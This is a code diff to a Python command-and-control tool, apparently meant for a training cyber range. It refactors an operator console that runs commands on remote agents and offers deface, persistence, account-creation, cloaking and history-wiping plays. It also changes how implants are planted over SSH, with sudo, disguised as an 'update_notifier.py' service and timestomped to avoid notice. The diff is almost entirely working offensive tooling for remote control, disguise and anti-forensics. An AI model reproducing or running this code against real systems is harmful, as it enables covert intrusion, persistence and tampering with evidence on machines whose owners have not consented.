@@ -99,13 +99,90 @@ def new_password():
 
 
 def sha512_crypt(password):
-    import crypt
+    try:
+        import crypt
 
-    method = getattr(crypt, "METHOD_SHA512", None)
-    if method is not None:
-        return crypt.crypt(password, method)
-    salt = "".join(random.SystemRandom().choice("abcdefghijklmnopqrstuvwxyz0123456789") for _ in range(8))
-    return crypt.crypt(password, "$6$" + salt)
+        method = getattr(crypt, "METHOD_SHA512", None)
+        if method is not None:
+            return crypt.crypt(password, method)
+        salt = "".join(random.SystemRandom().choice("abcdefghijklmnopqrstuvwxyz0123456789") for _ in range(8))
+        return crypt.crypt(password, "$6$" + salt)
+    except ImportError:
+        return _sha512_crypt(password)
+
+
+def _sha512_crypt(password, salt=None, rounds=5000):
+    alphabet = "./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
+    if not salt:
+        salt = "".join(random.SystemRandom().choice(alphabet) for _ in range(16))
+    password_b = password.encode("utf-8")
+    salt_b = salt.encode("ascii")
+    alt = hashlib.sha512(password_b + salt_b + password_b).digest()
+    ctx = hashlib.sha512()
+    ctx.update(password_b)
+    ctx.update(salt_b)
+    left = len(password_b)
+    while left > 64:
+        ctx.update(alt)
+        left -= 64
+    ctx.update(alt[:left])
+    bit = len(password_b)
+    while bit:
+        ctx.update(alt if bit & 1 else password_b)
+        bit >>= 1
+    digest = ctx.digest()
+    tmp = hashlib.sha512()
+    for _ in range(len(password_b)):
+        tmp.update(password_b)
+    block = tmp.digest()
+    password_seq = block * (len(password_b) // 64) + block[: len(password_b) % 64]
+    tmp = hashlib.sha512()
+    for _ in range(16 + digest[0]):
+        tmp.update(salt_b)
+    block = tmp.digest()
+    salt_seq = block * (len(salt_b) // 64) + block[: len(salt_b) % 64]
+    for round_i in range(rounds):
+        ctx = hashlib.sha512()
+        ctx.update(password_seq if round_i % 2 else digest)
+        if round_i % 3:
+            ctx.update(salt_seq)
+        if round_i % 7:
+            ctx.update(password_seq)
+        ctx.update(digest if round_i % 2 else password_seq)
+        digest = ctx.digest()
+
+    def chunk(a, b, c, n):
+        value = (a << 16) | (b << 8) | c
+        out = ""
+        for _ in range(n):
+            out += alphabet[value & 63]
+            value >>= 6
+        return out
+
+    encoded = ""
+    encoded += chunk(digest[0], digest[21], digest[42], 4)
+    encoded += chunk(digest[22], digest[43], digest[1], 4)
+    encoded += chunk(digest[44], digest[2], digest[23], 4)
+    encoded += chunk(digest[3], digest[24], digest[45], 4)
+    encoded += chunk(digest[25], digest[46], digest[4], 4)
+    encoded += chunk(digest[47], digest[5], digest[26], 4)
+    encoded += chunk(digest[6], digest[27], digest[48], 4)
+    encoded += chunk(digest[28], digest[49], digest[7], 4)
+    encoded += chunk(digest[50], digest[8], digest[29], 4)
+    encoded += chunk(digest[9], digest[30], digest[51], 4)
+    encoded += chunk(digest[31], digest[52], digest[10], 4)
+    encoded += chunk(digest[53], digest[11], digest[32], 4)
+    encoded += chunk(digest[12], digest[33], digest[54], 4)
+    encoded += chunk(digest[34], digest[55], digest[13], 4)
+    encoded += chunk(digest[56], digest[14], digest[35], 4)
+    encoded += chunk(digest[15], digest[36], digest[57], 4)
+    encoded += chunk(digest[37], digest[58], digest[16], 4)
+    encoded += chunk(digest[59], digest[17], digest[38], 4)
+    encoded += chunk(digest[18], digest[39], digest[60], 4)
+    encoded += chunk(digest[40], digest[61], digest[19], 4)
+    encoded += chunk(digest[62], digest[20], digest[41], 4)
+    encoded += chunk(0, 0, digest[63], 2)
+    return "$6${0}${1}".format(salt, encoded)
 
 
 def heredoc(body, marker):
@@ -3154,106 +3231,116 @@ def repl(hub, kit):
         line = line.strip()
         if not line:
             continue
-        if line in ("quit", "exit"):
+        try:
+            selected, actor = repl_line(line, hub, kit, selected, actor)
+        except Exception as exc:
+            log("command failed: {0}".format(exc))
+            continue
+        if selected == "QUIT":
             return
-        if line == "help":
-            log(HELP)
-            continue
-        if line == "sessions":
-            log(hub.format_sessions())
-            continue
-        if line == "ports":
-            for name in ("tcp", "http", "dns", "mqtt", "ws"):
-                log("{0} {1}".format(name, hub.ports.get(name)))
-            log("icmp echo (raw)")
-            log("dns zone {0}".format(hub.zone))
-            continue
-        parts = line.split()
-        if parts[0] == "use" and len(parts) >= 2:
-            selected = sanitize_id(parts[1])
-            log("using {0}".format(selected))
-            continue
-        if parts[0] == "back":
-            selected = None
-            continue
-        if parts[0] == "profile" and len(parts) == 2 and parts[1] in ("continuous", "off", "live", "hunt"):
-            targets = [selected] if selected else hub.online_ids()
-            if not targets:
-                log("no agent selected")
-                continue
-            for sid in targets:
-                hub.set_profile(sid, parts[1])
-                log("{0} profile {1} queued".format(sid, parts[1]))
-            continue
-        if parts[0] == "broadcast":
-            command = line[len("broadcast") :].strip()
-            targets = hub.online_ids()
-            if not command or not targets:
-                log("nothing to run")
-                continue
-            for sid in targets:
-                log("---- {0} ----".format(sid))
-                log(hub.exec_cmd(sid, command, CMD_TIMEOUT).rstrip("\n"))
-            continue
-        if parts[0] == "play":
-            parsed = parse_play(parts, line, actor)
-            if not parsed:
-                log("usage: play look | deface [nobackup] | undo | history | persist | shell | wall | account | cloak | veil | stamp | boot")
-                log("type help for the full list")
-                continue
-            kind, play_actor, user, shell_name, message, stamp_target, stamp_ref, wipe_history = parsed
-            if play_actor:
-                actor = play_actor
-            targets = [selected] if selected else hub.online_ids()
-            if len(targets) != 1:
-                log("use <id> first (play runs on one agent)")
-                continue
-            sid = targets[0]
-            if hub.profile_of(sid) == "off" and kind not in ("look", "history"):
-                log("this agent is off. profile continuous first. It hears that on the next quiet check.")
-            opts = play_opts(kit, hub, actor, user, shell_name, message, stamp_target, stamp_ref)
-            opts["all"] = wipe_history
-            if kind == "account" and not hub.os_of(sid).startswith("win"):
-                plain, _hashed = kit.account_hash(actor)
-                log("login for {0} is local only (not in the tasking): {1}".format(actor, plain))
-            script = play_script(kind, sid, hub, kit, opts)
-            log(hub.exec_cmd(sid, script, CMD_TIMEOUT).rstrip("\n"))
-            continue
-        if parts[0] == "shell" and len(parts) == 1:
-            targets = [selected] if selected else hub.online_ids()
-            if len(targets) != 1:
-                log("use <id> first")
-                continue
-            line_shell(hub, targets[0])
-            continue
-        if parts[0] == "tty" and len(parts) == 1:
-            targets = [selected] if selected else hub.online_ids()
-            if len(targets) != 1:
-                log("use <id> first")
-                continue
-            run_tty(hub, targets[0])
-            continue
-        if parts[0] == "get" and len(parts) in (2, 3):
-            targets = [selected] if selected else hub.online_ids()
-            if len(targets) != 1:
-                log("use <id> first")
-                continue
-            remote = parts[1]
-            local = parts[2] if len(parts) == 3 else os.path.basename(remote)
-            cmd_get(hub, targets[0], remote, local)
-            continue
-        if parts[0] == "put" and len(parts) == 3:
-            targets = [selected] if selected else hub.online_ids()
-            if len(targets) != 1:
-                log("use <id> first")
-                continue
-            cmd_put(hub, targets[0], parts[1], parts[2])
-            continue
+def repl_line(line, hub, kit, selected, actor):
+    if line in ("quit", "exit"):
+        return "QUIT", actor
+    if line == "help":
+        log(HELP)
+        return selected, actor
+    if line == "sessions":
+        log(hub.format_sessions())
+        return selected, actor
+    if line == "ports":
+        for name in ("tcp", "http", "dns", "mqtt", "ws"):
+            log("{0} {1}".format(name, hub.ports.get(name)))
+        log("icmp echo (raw)")
+        log("dns zone {0}".format(hub.zone))
+        return selected, actor
+    parts = line.split()
+    if parts[0] == "use" and len(parts) >= 2:
+        selected = sanitize_id(parts[1])
+        log("using {0}".format(selected))
+        return selected, actor
+    if parts[0] == "back":
+        selected = None
+        return selected, actor
+    if parts[0] == "profile" and len(parts) == 2 and parts[1] in ("continuous", "off", "live", "hunt"):
+        targets = [selected] if selected else hub.online_ids()
+        if not targets:
+            log("no agent selected")
+            return selected, actor
+        for sid in targets:
+            hub.set_profile(sid, parts[1])
+            log("{0} profile {1} queued".format(sid, parts[1]))
+        return selected, actor
+    if parts[0] == "broadcast":
+        command = line[len("broadcast") :].strip()
+        targets = hub.online_ids()
+        if not command or not targets:
+            log("nothing to run")
+            return selected, actor
+        for sid in targets:
+            log("---- {0} ----".format(sid))
+            log(hub.exec_cmd(sid, command, CMD_TIMEOUT).rstrip("\n"))
+        return selected, actor
+    if parts[0] == "play":
+        parsed = parse_play(parts, line, actor)
+        if not parsed:
+            log("usage: play look | deface [nobackup] | undo | history | persist | shell | wall | account | cloak | veil | stamp | boot")
+            log("type help for the full list")
+            return selected, actor
+        kind, play_actor, user, shell_name, message, stamp_target, stamp_ref, wipe_history = parsed
+        if play_actor:
+            actor = play_actor
+        targets = [selected] if selected else hub.online_ids()
+        if len(targets) != 1:
+            log("use <id> first (play runs on one agent)")
+            return selected, actor
+        sid = targets[0]
+        if hub.profile_of(sid) == "off" and kind not in ("look", "history"):
+            log("this agent is off. profile continuous first. It hears that on the next quiet check.")
+        opts = play_opts(kit, hub, actor, user, shell_name, message, stamp_target, stamp_ref)
+        opts["all"] = wipe_history
+        if kind == "account" and not hub.os_of(sid).startswith("win"):
+            plain, _hashed = kit.account_hash(actor)
+            log("login for {0} is local only (not in the tasking): {1}".format(actor, plain))
+        script = play_script(kind, sid, hub, kit, opts)
+        log(hub.exec_cmd(sid, script, CMD_TIMEOUT).rstrip("\n"))
+        return selected, actor
+    if parts[0] == "shell" and len(parts) == 1:
         targets = [selected] if selected else hub.online_ids()
         if len(targets) != 1:
             log("use <id> first")
-            continue
-        log(hub.exec_cmd(targets[0], line, CMD_TIMEOUT).rstrip("\n"))
+            return selected, actor
+        line_shell(hub, targets[0])
+        return selected, actor
+    if parts[0] == "tty" and len(parts) == 1:
+        targets = [selected] if selected else hub.online_ids()
+        if len(targets) != 1:
+            log("use <id> first")
+            return selected, actor
+        run_tty(hub, targets[0])
+        return selected, actor
+    if parts[0] == "get" and len(parts) in (2, 3):
+        targets = [selected] if selected else hub.online_ids()
+        if len(targets) != 1:
+            log("use <id> first")
+            return selected, actor
+        remote = parts[1]
+        local = parts[2] if len(parts) == 3 else os.path.basename(remote)
+        cmd_get(hub, targets[0], remote, local)
+        return selected, actor
+    if parts[0] == "put" and len(parts) == 3:
+        targets = [selected] if selected else hub.online_ids()
+        if len(targets) != 1:
+            log("use <id> first")
+            return selected, actor
+        cmd_put(hub, targets[0], parts[1], parts[2])
+        return selected, actor
+    targets = [selected] if selected else hub.online_ids()
+    if len(targets) != 1:
+        log("use <id> first")
+        return selected, actor
+    log(hub.exec_cmd(targets[0], line, CMD_TIMEOUT).rstrip("\n"))
+
+    return selected, actor
 
 
 def load_config(path):
@@ -3862,6 +3949,15 @@ def ssh_exec(config, alias, command, timeout, batch):
     return code, out or ""
 
 
+def ssh_exec_tty(config, alias, command, timeout):
+    proc = subprocess.Popen(["ssh", "-tt", "-F", config, alias, "--", command])
+    try:
+        return proc.wait(timeout=timeout or 180)
+    except subprocess.TimeoutExpired:
+        proc.kill()
+        return 124
+
+
 def watch_main(args):
     doc = load_lab_hosts(args.hosts)
     targets, skipped = watch_targets(doc, args.include_wan)
@@ -4114,16 +4210,36 @@ def linux_agent_start(remote_py, c2, channel, token, sid, profile, ports, zone):
     ]
     quoted = "python3 {0} {1}".format(py, " ".join(shell_quote(part) for part in rest))
     return (
+        "src=$1\n"
         "mkdir -p \"$(dirname {pyfile})\" /var/lib/update-notifier\n"
+        "if [ -n \"$src\" ] && [ -f \"$src\" ]; then cp \"$src\" {pyfile}; chmod 644 {pyfile}; rm -f \"$src\"; fi\n"
         "if [ -f /var/tmp/range-agent.pid ]; then kill \"$(cat /var/tmp/range-agent.pid)\" 2>/dev/null || true; rm -f /var/tmp/range-agent.pid /var/tmp/range-agent.log; fi\n"
-        "rm -f /root/range.py \"$HOME/range.py\"\n"
-        "if [ -e {ref} ]; then touch -r {ref} {pyfile}; fi\n"
-        "if [ -f {pid} ] && kill -0 \"$(cat {pid})\" 2>/dev/null; then echo ALREADY; exit 0; fi\n"
+        "rm -f /root/range.py\n"
+        "for old in $(ps -eo pid,args | awk '/update_notifier.py|range.py agent/ && !/awk/ {{print $1}}'); do kill \"$old\" 2>/dev/null || true; done\n"
+        "if [ -e {ref} ] && [ -f {pyfile} ]; then touch -r {ref} {pyfile}; fi\n"
         "setsid {cmd} </dev/null >{log} 2>&1 &\n"
         "echo $! >{pid}\n"
         "if [ -e {ref} ]; then touch -r {ref} {log} {pid}; fi\n"
-        "echo STARTED\n"
+        "if kill -0 \"$(cat {pid})\" 2>/dev/null; then echo STARTED; exit 0; fi\n"
+        "echo FAILED\n"
+        "exit 1\n"
     ).format(cmd=quoted, pyfile=pyfile, ref=shell_quote(LINUX_STAMP_REF), pid=shell_quote(LINUX_AGENT_PID), log=shell_quote(LINUX_AGENT_LOG))
+
+
+def linux_user_launch(c2, channel, token, sid, profile, ports, zone, use_sudo):
+    body = linux_agent_start(LINUX_AGENT_PATH, c2, channel, token, sid, profile, ports, zone)
+    marker = "RANGE_INSTALL_END"
+    run = "sudo bash" if use_sudo else "bash"
+    return (
+        "cat > \"$HOME/.update-notifier.inst\" << '" + marker + "'\n"
+        + body
+        + marker + "\n"
+        "chmod 700 \"$HOME/.update-notifier.inst\"\n"
+        + run + " \"$HOME/.update-notifier.inst\" \"$HOME/update_notifier.py\"\n"
+        "rc=$?\n"
+        "rm -f \"$HOME/.update-notifier.inst\"\n"
+        "exit $rc\n"
+    )
 
 
 def windows_agent_start(use_python, c2, channel, token, sid, profile, ports, zone):
@@ -4199,8 +4315,8 @@ def plant_selfcheck():
     if ids != ["180", "44", "82"]:
         failures.append("plant-id")
     ports = {"tcp": 443, "http": 80, "dns": 53, "mqtt": 1883, "ws": 8070}
-    script = linux_agent_start(LINUX_AGENT_PATH, "10.0.0.10", "ws", "lab-token-ok", "180", "continuous", ports, "lab")
-    if "STARTED" not in script or "update_notifier.py" not in script or "touch -r" not in script or "/root/range.py" not in script:
+    script = linux_user_launch("10.0.0.10", "ws", "lab-token-ok", "180", "continuous", ports, "lab", True)
+    if "sudo bash" not in script or "STARTED" not in script or "update_notifier.py" not in script or "touch -r" not in script or "/root/range.py" not in script:
         failures.append("plant-linux")
     if shutil.which("bash"):
         proc = subprocess.Popen(["bash", "-n"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
@@ -4279,9 +4395,9 @@ def plant_main(args):
             remote_path = WIN_AGENT_PS1
         else:
             local_path = linux_src
-            remote_path = LINUX_AGENT_PATH if host["user"] == "root" else ".local/lib/python3/dist-packages/update_notifier.py"
+            remote_path = "update_notifier.py"
         log("---- copy {0} {1} id {2} ----".format(host["alias"], host["ip"], host["sid"]))
-        prep = "mkdir -p \"$(dirname {0})\"".format(shell_quote(remote_path)) if remote_path.startswith("/") else "mkdir -p \"$HOME/.local/lib/python3/dist-packages\""
+        prep = "mkdir -p \"$HOME/.local/lib/python3/dist-packages\""
         if host["windows"]:
             prep = "powershell.exe -NoProfile -NonInteractive -Command \"New-Item -ItemType Directory -Force -Path $env:ProgramData\\Microsoft\\Diagnosis | Out-Null\""
         ssh_exec(args.ssh_config, host["alias"], prep, 20, True)
@@ -4292,13 +4408,18 @@ def plant_main(args):
             continue
         if host["windows"]:
             command = windows_agent_start(not use_ps1, c2, channel, token, host["sid"], profile, ports, zone)
+            code, out = ssh_exec(args.ssh_config, host["alias"], command, 40, True)
+            if out.strip():
+                sys.stdout.write(out if out.endswith("\n") else out + "\n")
+            ok = "STARTED" in out or "ALREADY" in out
         else:
-            remote_py = remote_path if remote_path.startswith("/") else "$HOME/" + remote_path
-            command = linux_agent_start(remote_py, c2, channel, token, host["sid"], profile, ports, zone)
-        code, out = ssh_exec(args.ssh_config, host["alias"], command, 40, True)
-        if out.strip():
-            sys.stdout.write(out if out.endswith("\n") else out + "\n")
-        if "STARTED" in out or "ALREADY" in out:
+            use_sudo = host["user"] != "root"
+            if use_sudo:
+                log("{0} will ask for the sudo password of {1}.".format(host["ip"], host["user"]))
+            command = linux_user_launch(c2, channel, token, host["sid"], profile, ports, zone, use_sudo)
+            code = ssh_exec_tty(args.ssh_config, host["alias"], command, 180)
+            ok = code == 0
+        if ok:
             log("{0} agent id {1}".format(host["ip"], host["sid"]))
         else:
             failed += 1
